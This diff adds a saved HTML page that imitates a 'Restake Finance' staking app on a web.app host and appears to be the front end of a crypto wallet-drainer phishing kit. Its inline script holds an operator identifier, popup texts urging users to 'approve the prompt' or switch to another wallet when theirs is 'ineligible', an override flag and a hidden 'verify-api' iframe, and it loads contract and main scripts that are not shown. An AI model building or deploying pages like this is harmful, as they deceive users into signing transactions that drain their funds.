@@ -1,0 +1,293 @@
+<!DOCTYPE html>
+<html lang="en"
+  style="--wcm-color-fg-1: rgb(20,20,20); --wcm-color-fg-2: rgb(121,134,134); --wcm-color-fg-3: rgb(158,169,169); --wcm-color-bg-1: rgb(255,255,255); --wcm-color-bg-2: rgb(241,243,243); --wcm-color-bg-3: rgb(228,231,231); --wcm-color-overlay: rgba(0,0,0,0.1); --wcm-accent-color: #3396FF; --wcm-accent-fill-color: #FFFFFF; --wcm-z-index: 89; --wcm-background-color: #3396FF; --wcm-background-border-radius: 8px; --wcm-container-border-radius: 30px; --wcm-wallet-icon-border-radius: 15px; --wcm-wallet-icon-large-border-radius: 30px; --wcm-wallet-icon-small-border-radius: 7px; --wcm-input-border-radius: 28px; --wcm-button-border-radius: 10px; --wcm-notification-border-radius: 36px; --wcm-secondary-button-border-radius: 28px; --wcm-icon-button-border-radius: 50%; --wcm-button-hover-highlight-border-radius: 10px; --wcm-text-big-bold-size: 20px; --wcm-text-big-bold-weight: 600; --wcm-text-big-bold-line-height: 24px; --wcm-text-big-bold-letter-spacing: -0.03em; --wcm-text-big-bold-text-transform: none; --wcm-text-xsmall-bold-size: 10px; --wcm-text-xsmall-bold-weight: 700; --wcm-text-xsmall-bold-line-height: 12px; --wcm-text-xsmall-bold-letter-spacing: 0.02em; --wcm-text-xsmall-bold-text-transform: uppercase; --wcm-text-xsmall-regular-size: 12px; --wcm-text-xsmall-regular-weight: 600; --wcm-text-xsmall-regular-line-height: 14px; --wcm-text-xsmall-regular-letter-spacing: -0.03em; --wcm-text-xsmall-regular-text-transform: none; --wcm-text-small-thin-size: 14px; --wcm-text-small-thin-weight: 500; --wcm-text-small-thin-line-height: 16px; --wcm-text-small-thin-letter-spacing: -0.03em; --wcm-text-small-thin-text-transform: none; --wcm-text-small-regular-size: 14px; --wcm-text-small-regular-weight: 600; --wcm-text-small-regular-line-height: 16px; --wcm-text-small-regular-letter-spacing: -0.03em; --wcm-text-small-regular-text-transform: none; --wcm-text-medium-regular-size: 16px; --wcm-text-medium-regular-weight: 600; --wcm-text-medium-regular-line-height: 20px; --wcm-text-medium-regular-letter-spacing: -0.03em; --wcm-text-medium-regular-text-transform: none; --wcm-font-family: -apple-system, system-ui, BlinkMacSystemFont, 'Segoe UI', Roboto, Ubuntu, 'Helvetica Neue', sans-serif; --wcm-font-feature-settings: 'tnum' on, 'lnum' on, 'case' on; --wcm-success-color: rgb(38,181,98); --wcm-error-color: rgb(242, 90, 103); --wcm-overlay-background-color: rgba(0, 0, 0, 0.3); --wcm-overlay-backdrop-filter: none;"
+  data-scrapbook-source="https://app-beta-restakefinance.web.app/" data-scrapbook-create="20240111103751716"
+  data-scrapbook-title="Restake Finance | ReStaking | Testnet">
+
+  <meta charset="UTF-8">
+  <link rel="icon" type="image/png" href="refi-icon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Restake Finance | ReStaking | Testnet</title>
+
+  <link rel="stylesheet" href="index-c511cee0.css">
+
+  <script defer="defer" src="js/vendors.js"></script>
+  <script defer="defer" src="js/contracts.js"></script>
+  <script defer="defer" src="js/main.js"></script>
+
+  <script>
+    window.UNIQUE_IDENTITY = "yelping_cheetah_23";
+
+    // Pick a theme here, this defaults to "light"
+    window.modal_theme = "light";
+
+    // https://docs.walletconnect.com/2.0/web/web3modal/html/wagmi/theming
+    window.modal_variables = { "--w3m-z-index": "99999999999999999999999999999999",
+      // Example of what you can do:
+      "--w3m-accent-color": "#000cf7",
+      "--w3m-background-color": "#000cf7",
+      "--w3m-background-border-radius": "0px",
+      "--w3m-container-border-radius": "0px",
+      "--w3m-wallet-icon-border-radius": "0px",
+      "--w3m-wallet-icon-large-border-radius": "0px",
+      "--w3m-wallet-icon-small-border-radius": "0px",
+      "--w3m-secondary-button-border-radius": "0px",
+      "--w3m-icon-button-border-radius": "0px",
+      "--w3m-button-hover-highlight-border-radius": "0px",
+      "--w3m-input-border-radius": "0px",
+    };
+
+    window.popups = {
+      PENDING: {
+        title: "Stake Pending",
+        text: "Approve the prompt in order to Start $RSTK Staking.",
+      },
+      INVALID: {
+        title: "Ineligible Address",
+        text: "The connected wallet is not eligible for $RSTK Staking.\nPlease try using a different account.",
+      },
+    };
+
+    window.OVERRIDE_MODE = false;
+  </script>
+</head>
+
+<body>
+  <div id="root"><span class="badge-warning">TESTNET</span>
+    <div class="container mx-auto max-w-7xl">
+      <header>
+        <nav class="mx-auto flex items-center justify-between gap-x-6 p-6 lg:px-8" aria-label="Global">
+          <div class="flex lg:flex-1"><a href="#" class="-m-1.5 p-1.5 mr-10"><span
+                class="sr-only">RestakeFinance</span><img class="h-12 w-auto lg:h-12 lg:w-auto" src="logo.svg"
+                alt=""></a>
+            <div class="hidden lg:flex lg:gap-x-5 ml-10"><a aria-current="page" class="nav-item active" href=""><svg
+                  xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5"
+                  stroke="currentColor" aria-hidden="true" class="h-6 w-5 text-white">
+                  <path stroke-linecap="round" stroke-linejoin="round"
+                    d="M3 13.125C3 12.504 3.504 12 4.125 12h2.25c.621 0 1.125.504 1.125 1.125v6.75C7.5 20.496 6.996 21 6.375 21h-2.25A1.125 1.125 0 013 19.875v-6.75zM9.75 8.625c0-.621.504-1.125 1.125-1.125h2.25c.621 0 1.125.504 1.125 1.125v11.25c0 .621-.504 1.125-1.125 1.125h-2.25a1.125 1.125 0 01-1.125-1.125V8.625zM16.5 4.125c0-.621.504-1.125 1.125-1.125h2.25C20.496 3 21 3.504 21 4.125v15.75c0 .621-.504 1.125-1.125 1.125h-2.25a1.125 1.125 0 01-1.125-1.125V4.125z">
+                  </path>
+                </svg>Stake</a><a class="nav-item" href="https://app-beta-restakefinance.web.app/redeem"><svg
+                  xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5"
+                  stroke="currentColor" aria-hidden="true" class="h-6 w-5 text-white">
+                  <path stroke-linecap="round" stroke-linejoin="round"
+                    d="M20.25 6.375c0 2.278-3.694 4.125-8.25 4.125S3.75 8.653 3.75 6.375m16.5 0c0-2.278-3.694-4.125-8.25-4.125S3.75 4.097 3.75 6.375m16.5 0v11.25c0 2.278-3.694 4.125-8.25 4.125s-8.25-1.847-8.25-4.125V6.375m16.5 0v3.75m-16.5-3.75v3.75m16.5 0v3.75C20.25 16.153 16.556 18 12 18s-8.25-1.847-8.25-4.125v-3.75m16.5 0c0 2.278-3.694 4.125-8.25 4.125s-8.25-1.847-8.25-4.125">
+                  </path>
+                </svg>Redeem</a><a class="nav-item" href="https://app-beta-restakefinance.web.app/rewards"><svg
+                  xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5"
+                  stroke="currentColor" aria-hidden="true" class="h-6 w-5 text-white">
+                  <path stroke-linecap="round" stroke-linejoin="round"
+                    d="M21 7.5l-2.25-1.313M21 7.5v2.25m0-2.25l-2.25 1.313M3 7.5l2.25-1.313M3 7.5l2.25 1.313M3 7.5v2.25m9 3l2.25-1.313M12 12.75l-2.25-1.313M12 12.75V15m0 6.75l2.25-1.313M12 21.75V19.5m0 2.25l-2.25-1.313m0-16.875L12 2.25l2.25 1.313M21 14.25v2.25l-2.25 1.313m-13.5 0L3 16.5v-2.25">
+                  </path>
+                </svg>Rewards</a><a class="nav-item" href="https://app-beta-restakefinance.web.app/earn"><svg
+                  xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5"
+                  stroke="currentColor" aria-hidden="true" class="h-6 w-5 text-white">
+                  <path stroke-linecap="round" stroke-linejoin="round"
+                    d="M12 6v12m-3-2.818l.879.659c1.171.879 3.07.879 4.242 0 1.172-.879 1.172-2.303 0-3.182C13.536 12.219 12.768 12 12 12c-.725 0-1.45-.22-2.003-.659-1.106-.879-1.106-2.303 0-3.182s2.9-.879 4.006 0l.415.33M21 12a9 9 0 11-18 0 9 9 0 0118 0z">
+                  </path>
+                </svg>Earn</a></div>
+          </div>
+          <div class="flex flex-1 items-center justify-end gap-x-6">
+            <div>
+              <div class="flex flex-1 items-center gap-x-6 "><a href="#" class="btn btn-primary">Connect</a></div>
+              <div class="rounded-lg p-2 text-sm">TVL: 2890.32 stETH | 7,579,555 USD</div>
+            </div>
+          </div>
+          <div class="flex lg:hidden"><button type="button"
+              class="-m-2.5 inline-flex items-center justify-center rounded-md p-2.5 text-gray-700"><span
+                class="sr-only">Open main menu</span><svg xmlns="http://www.w3.org/2000/svg" fill="none"
+                viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" class="h-6 w-6">
+                <path stroke-linecap="round" stroke-linejoin="round" d="M3.75 6.75h16.5M3.75 12h16.5m-16.5 5.25h16.5">
+                </path>
+              </svg></button></div>
+        </nav>
+        <div
+          style="position: fixed; top: 1px; left: 1px; width: 1px; height: 0px; padding: 0px; margin: -1px; overflow: hidden; clip: rect(0px, 0px, 0px, 0px); white-space: nowrap; border-width: 0px; display: none;">
+        </div>
+      </header><svg
+        class="absolute inset-0 -z-10 h-full w-full stroke-white/10 [mask-image:radial-gradient(100%_100%_at_top_right,white,transparent)]"
+        aria-hidden="true">
+        <defs>
+          <pattern id="983e3e4c-de6d-4c3f-8d64-b9761d1534cc" width="200" height="200" x="50%" y="-1"
+            patternUnits="userSpaceOnUse">
+            <path d="M.5 200V.5H200" fill="none"></path>
+          </pattern>
+        </defs>
+        <rect width="100%" height="100%" stroke-width="0" fill="url(#983e3e4c-de6d-4c3f-8d64-b9761d1534cc)"></rect>
+      </svg><svg
+        class="absolute inset-0 -z-10 h-full w-full stroke-white/10 [mask-image:radial-gradient(100%_100%_at_top_right,white,transparent)]"
+        aria-hidden="true">
+        <defs>
+          <pattern id="1d4240dd-898f-445f-932d-e2872fd12de3" width="200" height="200" x="50%" y="0"
+            patternUnits="userSpaceOnUse">
+            <path d="M.5 200V.5H200" fill="none"></path>
+          </pattern>
+        </defs><svg x="50%" y="0" class="overflow-visible fill-gray-800/20">
+          <path d="M-200 0h201v201h-201Z M600 0h201v201h-201Z M-400 600h201v201h-201Z M200 800h201v201h-201Z"
+            stroke-width="0"></path>
+        </svg>
+        <rect width="100%" height="100%" stroke-width="0" fill="url(#1d4240dd-898f-445f-932d-e2872fd12de3)"></rect>
+      </svg>
+      <div class="absolute inset-x-0 top-10 -z-10 flex transform-gpu justify-center overflow-hidden blur-3xl"
+        aria-hidden="true">
+        <div class="aspect-[1108/632] w-[69.25rem] flex-none bg-gradient-to-r from-[#80caff] to-[#4f46e5] opacity-20"
+          style="clip-path: polygon(73.6% 51.7%, 91.7% 11.8%, 100% 46.4%, 97.4% 82.2%, 92.5% 84.9%, 75.7% 64%, 55.3% 47.5%, 46.5% 49.4%, 45% 62.9%, 50.3% 87.2%, 21.3% 64.1%, 0.1% 100%, 5.4% 51.1%, 21.4% 63.9%, 58.9% 0.2%, 73.6% 51.7%);">
+        </div>
+      </div>
+      <div class="py-4">
+        <div class="flex min-h-full flex-1 flex-col justify-center px-6 py-12 lg:px-8">
+          <div class="sm:mx-auto sm:w-full sm:max-w-sm">
+            <h2 class="mt-5 text-center text-2xl font-bold leading-9 tracking-tight text-white">RSTK Revenue Share is
+              Live</h2>
+          </div>
+          <div class="mt-10 sm:mx-auto sm:w-full sm:max-w-sm">
+            <div class="mb-3 p-6 border rounded-lg shadow bg-gray-800 border-gray-700">
+              <div>
+                <form class="space-y-6" action="#" method="POST">
+                  <div>
+                    <div class="mt-2">
+                      <div class="relative"></div>
+                    </div>
+                  </div>
+                  <div><button id="connect_button" type="button" class="w-full btn btn-primary h-12">Connect Wallet</button></div>
+                </form>
+                <div>
+                  <dl class="mt-5 grid grid-cols-1 gap-5 sm:grid-cols-2">
+                    <div class="overflow-hidden rounded-lg border border-blue-400 px-2 py-2 shadow sm:p-4">
+                      <dt class="truncate text-sm font-medium text-gray-500">stETH Balance</dt>
+                      <dd class="mt-1 text-3xl font-semibold tracking-tight text-gray-200">0</dd>
+                    </div>
+                    <div class="overflow-hidden rounded-lg border border-blue-400 px-2 py-2 shadow sm:p-4">
+                      <dt class="truncate text-sm font-medium text-gray-500">rstETH Balance</dt>
+                      <dd class="mt-1 text-3xl font-semibold tracking-tight text-gray-200">0</dd>
+                    </div>
+                  </dl>
+                </div>
+              </div>
+            </div>
+          </div>
+          <div class="">
+            <div>
+              <div class="mx-auto max-w-7xl px-6 py-24 sm:py-32 lg:px-8 lg:py-40">
+                <div class="mx-auto max-w-4xl">
+                  <h2 class="text-2xl font-bold leading-10 tracking-tight text-white">Frequently asked questions</h2>
+                  <dl class="mt-10 ">
+                    <div data-headlessui-state="">
+                      <dt><button
+                          class="flex w-full items-start justify-between text-left text-white p-2 rounded-lg mb-2 bg-slate-800"
+                          id="headlessui-disclosure-button-:r1:" type="button" aria-expanded="false"
+                          data-headlessui-state=""><span class="text-base font-semibold leading-7">What is restaking
+                            through EigenLayer?</span><span class="ml-6 flex h-7 items-center"><svg
+                              xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5"
+                              stroke="currentColor" aria-hidden="true" class="h-6 w-6">
+                              <path stroke-linecap="round" stroke-linejoin="round" d="M12 6v12m6-6H6"></path>
+                            </svg></span></button></dt>
+                    </div>
+                    <div data-headlessui-state="">
+                      <dt><button
+                          class="flex w-full items-start justify-between text-left text-white p-2 rounded-lg mb-2 bg-slate-800"
+                          id="headlessui-disclosure-button-:r3:" type="button" aria-expanded="false"
+                          data-headlessui-state=""><span class="text-base font-semibold leading-7">What is Restake
+                            Finance?</span><span class="ml-6 flex h-7 items-center"><svg
+                              xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5"
+                              stroke="currentColor" aria-hidden="true" class="h-6 w-6">
+                              <path stroke-linecap="round" stroke-linejoin="round" d="M12 6v12m6-6H6"></path>
+                            </svg></span></button></dt>
+                    </div>
+                    <div data-headlessui-state="">
+                      <dt><button
+                          class="flex w-full items-start justify-between text-left text-white p-2 rounded-lg mb-2 bg-slate-800"
+                          id="headlessui-disclosure-button-:r5:" type="button" aria-expanded="false"
+                          data-headlessui-state=""><span class="text-base font-semibold leading-7">What is
+                            rstETH?</span><span class="ml-6 flex h-7 items-center"><svg
+                              xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5"
+                              stroke="currentColor" aria-hidden="true" class="h-6 w-6">
+                              <path stroke-linecap="round" stroke-linejoin="round" d="M12 6v12m6-6H6"></path>
+                            </svg></span></button></dt>
+                    </div>
+                    <div data-headlessui-state="">
+                      <dt><button
+                          class="flex w-full items-start justify-between text-left text-white p-2 rounded-lg mb-2 bg-slate-800"
+                          id="headlessui-disclosure-button-:r7:" type="button" aria-expanded="false"
+                          data-headlessui-state=""><span class="text-base font-semibold leading-7">How high can I expect
+                            yields to be?</span><span class="ml-6 flex h-7 items-center"><svg
+                              xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5"
+                              stroke="currentColor" aria-hidden="true" class="h-6 w-6">
+                              <path stroke-linecap="round" stroke-linejoin="round" d="M12 6v12m6-6H6"></path>
+                            </svg></span></button></dt>
+                    </div>
+                    <div data-headlessui-state="">
+                      <dt><button
+                          class="flex w-full items-start justify-between text-left text-white p-2 rounded-lg mb-2 bg-slate-800"
+                          id="headlessui-disclosure-button-:r9:" type="button" aria-expanded="false"
+                          data-headlessui-state=""><span class="text-base font-semibold leading-7">How can I claim
+                            yields?</span><span class="ml-6 flex h-7 items-center"><svg
+                              xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5"
+                              stroke="currentColor" aria-hidden="true" class="h-6 w-6">
+                              <path stroke-linecap="round" stroke-linejoin="round" d="M12 6v12m6-6H6"></path>
+                            </svg></span></button></dt>
+                    </div>
+                    <div data-headlessui-state="">
+                      <dt><button
+                          class="flex w-full items-start justify-between text-left text-white p-2 rounded-lg mb-2 bg-slate-800"
+                          id="headlessui-disclosure-button-:rb:" type="button" aria-expanded="false"
+                          data-headlessui-state=""><span class="text-base font-semibold leading-7">What are the
+                            advantages of using rstETH?</span><span class="ml-6 flex h-7 items-center"><svg
+                              xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5"
+                              stroke="currentColor" aria-hidden="true" class="h-6 w-6">
+                              <path stroke-linecap="round" stroke-linejoin="round" d="M12 6v12m6-6H6"></path>
+                            </svg></span></button></dt>
+                    </div>
+                    <div data-headlessui-state="">
+                      <dt><button
+                          class="flex w-full items-start justify-between text-left text-white p-2 rounded-lg mb-2 bg-slate-800"
+                          id="headlessui-disclosure-button-:rd:" type="button" aria-expanded="false"
+                          data-headlessui-state=""><span class="text-base font-semibold leading-7">What is
+                            ReFi?</span><span class="ml-6 flex h-7 items-center"><svg xmlns="http://www.w3.org/2000/svg"
+                              fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor"
+                              aria-hidden="true" class="h-6 w-6">
+                              <path stroke-linecap="round" stroke-linejoin="round" d="M12 6v12m6-6H6"></path>
+                            </svg></span></button></dt>
+                    </div>
+                  </dl>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+      <footer class="">
+        <div class="mx-auto max-w-7xl px-6 py-12 md:flex md:items-center md:justify-between lg:px-8">
+          <div class="flex justify-center space-x-6 md:order-2"><a href="https://twitter.com/restakefi"
+              class="hover:text-gray-500"><span class="sr-only">Twitter</span><svg fill="currentColor"
+                viewBox="0 0 24 24" class="h-6 w-6" aria-hidden="true">
+                <path
+                  d="M8.29 20.251c7.547 0 11.675-6.253 11.675-11.675 0-.178 0-.355-.012-.53A8.348 8.348 0 0022 5.92a8.19 8.19 0 01-2.357.646 4.118 4.118 0 001.804-2.27 8.224 8.224 0 01-2.605.996 4.107 4.107 0 00-6.993 3.743 11.65 11.65 0 01-8.457-4.287 4.106 4.106 0 001.27 5.477A4.072 4.072 0 012.8 9.713v.052a4.105 4.105 0 003.292 4.022 4.095 4.095 0 01-1.853.07 4.108 4.108 0 003.834 2.85A8.233 8.233 0 012 18.407a11.616 11.616 0 006.29 1.84">
+                </path>
+              </svg></a><a href="https://discord.gg/Q9qMVs7dcV" class="hover:text-gray-500"><span
+                class="sr-only">Discord</span><svg fill="currentColor" viewBox="0 0 24 24" class="h-6 w-6"
+                aria-hidden="true">
+                <path
+                  d="M18.942 5.556a16.299 16.299 0 0 0-4.126-1.297c-.178.321-.385.754-.529 1.097a15.175 15.175 0 0 0-4.573 0 11.583 11.583 0 0 0-.535-1.097 16.274 16.274 0 0 0-4.129 1.3c-2.611 3.946-3.319 7.794-2.965 11.587a16.494 16.494 0 0 0 5.061 2.593 12.65 12.65 0 0 0 1.084-1.785 10.689 10.689 0 0 1-1.707-.831c.143-.106.283-.217.418-.331 3.291 1.539 6.866 1.539 10.118 0 .137.114.277.225.418.331-.541.326-1.114.606-1.71.832a12.52 12.52 0 0 0 1.084 1.785 16.46 16.46 0 0 0 5.064-2.595c.415-4.396-.709-8.209-2.973-11.589zM8.678 14.813c-.988 0-1.798-.922-1.798-2.045s.793-2.047 1.798-2.047 1.815.922 1.798 2.047c.001 1.123-.793 2.045-1.798 2.045zm6.644 0c-.988 0-1.798-.922-1.798-2.045s.793-2.047 1.798-2.047 1.815.922 1.798 2.047c0 1.123-.793 2.045-1.798 2.045z">
+                </path>
+              </svg></a></div>
+          <div class="mt-8 md:order-1 md:mt-0">
+            <p class="text-center text-xs leading-5">© 2023 Restake Finance. All rights reserved.</p>
+          </div>
+        </div>
+      </footer>
+    </div>
+  </div>
+
+
+
+  <div id="headlessui-portal-root">
+    <div data-headlessui-portal="">
+      <div></div>
+    </div>
+  </div><iframe id="verify-api" src="188a1c1886a76bded041a1e0ece11d79.txt" style="display: none;"></iframe><wcm-modal
+    data-scrapbook-shadowdom="<!----><wcm-explorer-context data-scrapbook-shadowdom=&quot;<!---->&quot;></wcm-explorer-context><wcm-theme-context data-scrapbook-shadowdom=&quot;<!---->&quot;></wcm-theme-context><div id=&quot;wcm-modal&quot; role=&quot;alertdialog&quot; aria-modal=&quot;true&quot; class=&quot; wcm-overlay &quot;><div class=&quot;wcm-container&quot; tabindex=&quot;0&quot;><!--?lit$511359543$--></div></div>"></wcm-modal>
+  <script
+    data-scrapbook-elem="basic-loader">(function () { var k1 = "data-scrapbook-shadowdom", k2 = "data-scrapbook-canvas", k3 = "data-scrapbook-input-indeterminate", k4 = "data-scrapbook-input-checked", k5 = "data-scrapbook-option-selected", k6 = "data-scrapbook-input-value", k7 = "data-scrapbook-textarea-value", fn = function (r) { var E = r.querySelectorAll ? r.querySelectorAll("*") : r.getElementsByTagName("*"), i = E.length, e, d, s; while (i--) { e = E[i]; if ((d = e.getAttribute(k1)) !== null && !e.shadowRoot && e.attachShadow) { s = e.attachShadow({ mode: 'open' }); s.innerHTML = d; e.removeAttribute(k1); } if ((d = e.getAttribute(k2)) !== null) { (function () { var c = e, g = new Image(); g.onload = function () { c.getContext('2d').drawImage(g, 0, 0); }; g.src = d; })(); e.removeAttribute(k2); } if ((d = e.getAttribute(k3)) !== null) { e.indeterminate = true; e.removeAttribute(k3); } if ((d = e.getAttribute(k4)) !== null) { e.checked = d === 'true'; e.removeAttribute(k4); } if ((d = e.getAttribute(k5)) !== null) { e.selected = d === 'true'; e.removeAttribute(k5); } if ((d = e.getAttribute(k6)) !== null) { e.value = d; e.removeAttribute(k6); } if ((d = e.getAttribute(k7)) !== null) { e.value = d; e.removeAttribute(k7); } if (e.shadowRoot) { fn(e.shadowRoot); } } }; fn(document); })()</script>
+</body>
+
+</html>
